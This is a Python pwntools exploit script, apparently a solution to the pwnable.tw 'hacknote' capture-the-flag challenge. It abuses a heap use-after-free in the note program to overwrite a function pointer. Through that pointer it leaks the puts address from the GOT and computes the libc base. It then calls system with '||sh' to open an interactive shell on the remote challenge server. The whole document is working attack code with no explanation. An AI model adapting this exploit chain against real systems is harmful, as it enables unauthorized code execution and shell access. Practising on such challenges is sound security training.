from pwn import *
context(os = 'linux',arch = 'i386', log_level = 'debug')
def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)

def add(size,content):
    p.recvuntil('choice :')
    p.send('1')
    p.recvuntil('size :')
    if size == 0:    
        p.send(str(size))
    else:
        p.send(str(size))
        p.recvuntil('Content :')
        p.send(content)

def delete(index):
    p.recvuntil('choice :')
    p.send('2')
    p.recvuntil('Index :')
    p.send(str(index))

def print_note(index):
    p.recvuntil('choice :')
    p.send('3')
    p.recvuntil('Index :')
    p.send(str(index))


elf = change_ld('./hacknote', './ld-2.23.so')
debug = 0
if debug == 1:
    p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})
else:
    p = remote('chall.pwnable.tw', 10102)


elf = ELF('./hacknote')
libc = ELF('./libc_32.so.6')
puts_got = elf.got['puts']
#gdb.attach(p)
add(0x20,'a')
add(0x20,'a')
delete(0)
delete(1)
#leak
add(8,p32(0x0804862B) + p32(puts_got))
print_note(0)
libc_base = u32(p.recv(4)) - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
delete(2)

add(8,p32(system_addr) + '||sh')
print_note(0)


p.interactive()
